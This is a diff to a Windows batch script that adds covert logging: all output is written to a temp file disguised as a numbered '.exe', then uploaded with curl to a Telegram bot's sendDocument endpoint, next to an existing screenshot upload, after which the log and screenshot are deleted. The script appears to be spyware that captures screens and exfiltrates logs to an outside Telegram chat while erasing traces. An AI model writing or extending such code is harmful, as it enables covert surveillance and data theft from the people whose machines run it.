@@ -4,6 +4,21 @@
 
 
 
+:: Set the log file path
+set "LOGFILE=%temp%\9875426.exe"
+
+:: Start logging from this point
+call :LogOutput > "%LOGFILE%" 2>&1
+exit
+
+:LogOutput
+:: Your long batch script starts here
+
+
+
+
+
+
 
 
 
@@ -23,7 +38,7 @@ if %instances% geq 2 (
 
 
 
-
+echo RUNEVERYCALLER.exe is not running. Continue.....
 
 
 
@@ -590,10 +605,21 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendPhoto" ^
      -F "caption=%ENCODED_CAPTION%" ^
      -F "photo=@%PHOTO_PATH%"
 
+
+
+:: Send the file (as a document)
+curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendDocument" ^
+     -F "chat_id=%CHAT_ID%" ^
+     -F "caption=%ENCODED_CAPTION%" ^
+     -F "document=@%LOGFILE%"
+
+
+
+
 echo Message sent to chat ID %CHAT_ID%
 
 del /f /q "%USERPROFILE%\Downloads\screenshot.png"
-
+del /f /q "%LOGFILE%"
 
 
 
@@ -623,7 +649,7 @@ set "lastMinute=%currentMinute%"
 set "currentSeconds=%time:~6,2%"
 if %currentSeconds% geq 50 (
     echo Seconds are 50 or greater. Exiting...
-    exit
+    goto :EOF
 )
 
 cls
